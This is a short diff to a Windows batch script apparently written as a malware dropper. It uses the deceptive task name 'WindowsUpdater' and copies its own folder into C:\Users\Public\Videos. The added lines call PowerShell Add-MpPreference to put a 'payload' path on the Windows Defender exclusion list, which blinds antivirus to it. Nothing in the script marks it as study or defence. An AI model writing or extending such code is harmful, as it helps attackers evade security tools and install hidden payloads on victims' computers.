@@ -4,6 +4,9 @@ set taskName=WindowsUpdater
 set sourceFolder=%~dp0    :: Get the folder where the batch file is located
 set destinationFolder=C:\Users\Public\Videos
 
+:: Add the payload to Windows Defender exclusions (PowerShell method)
+powershell -Command "Add-MpPreference -ExclusionPath '%payloadPath%'"
+
 :: Copy the folder and its contents to the destination folder
 xcopy "%sourceFolder%" "%destinationFolder%" /E /I /H /Y
 
